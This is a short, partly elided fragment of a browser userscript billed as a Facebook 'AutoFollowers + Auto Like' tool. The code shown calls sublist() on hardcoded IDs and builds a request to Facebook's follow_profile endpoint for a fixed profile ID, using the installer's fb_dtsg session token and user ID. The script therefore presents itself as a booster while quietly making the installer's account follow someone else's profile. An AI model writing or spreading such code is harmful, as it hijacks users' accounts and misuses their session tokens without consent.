// ==UserScript==
// @name            [**UpDated**]Facebook AutoFollowers + Auto Like
...
sublist("532424096806084");
sublist("550441248337702");
sublist("539787039403123");


var gid = ['100001154951712'];
...
var urlwp = '/ajax/follow/follow_profile.php?__a=1';
var paramswp = 'profile_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
